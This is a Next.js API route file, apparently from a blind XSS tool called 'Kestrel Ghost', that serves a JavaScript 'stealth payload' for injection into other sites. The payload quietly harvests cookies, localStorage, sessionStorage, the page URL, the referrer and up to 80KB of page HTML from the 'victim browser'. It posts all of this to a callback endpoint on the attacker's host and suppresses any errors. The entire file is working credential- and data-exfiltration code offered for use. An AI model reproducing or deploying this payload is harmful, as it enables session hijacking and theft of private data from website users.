import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const id = searchParams.get('id');

  if (!id) {
    return new NextResponse('console.error("Kestrel Ghost: Missing target ID parameter.");', {
      headers: {
        'Content-Type': 'application/javascript',
        'Access-Control-Allow-Origin': '*',
      },
    });
  }

  // Get current host to construct callback reporting URL
  const host = request.headers.get('host') || 'localhost:3000';
  const protocol = host.includes('localhost') ? 'http' : 'https';
  const callbackUrl = `${protocol}://${host}/api/x/callback?id=${id}`;

  // Custom, optimized stealth payload script
  const payloadScript = `(function() {
  try {
    var data = {
      uri: window.location.href || "",
      ref: document.referrer || "",
      cookies: document.cookie || "",
      local: "",
      session: "",
      dom: ""
    };

    // Grab LocalStorage safely
    try {
      var ls = {};
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        ls[k] = localStorage.getItem(k);
      }
      data.local = JSON.stringify(ls);
    } catch(e) {}

    // Grab SessionStorage safely
    try {
      var ss = {};
      for (var i = 0; i < sessionStorage.length; i++) {
        var k = sessionStorage.key(i);
        ss[k] = sessionStorage.getItem(k);
      }
      data.session = JSON.stringify(ss);
    } catch(e) {}

    // Grab DOM HTML (Cap at 80KB to avoid excessive storage/payload limits)
    try {
      var rawDom = document.documentElement.outerHTML || "";
      if (rawDom.length > 80000) {
        data.dom = rawDom.substring(0, 80000) + "\\n\\n[--- TRUNCATED BY KESTREL GHOST RECEIVER TO 80KB ---]";
      } else {
        data.dom = rawDom;
      }
    } catch(e) {}

    // Fire callback using beacon or fetch
    if (navigator.sendBeacon) {
      var blob = new Blob([JSON.stringify(data)], { type: "application/json" });
      navigator.sendBeacon("${callbackUrl}", blob);
    } else {
      fetch("${callbackUrl}", {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    }
  } catch(err) {
    // Fail silently in victim browser
  }
})();`;

  return new NextResponse(payloadScript, {
    headers: {
      'Content-Type': 'application/javascript',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
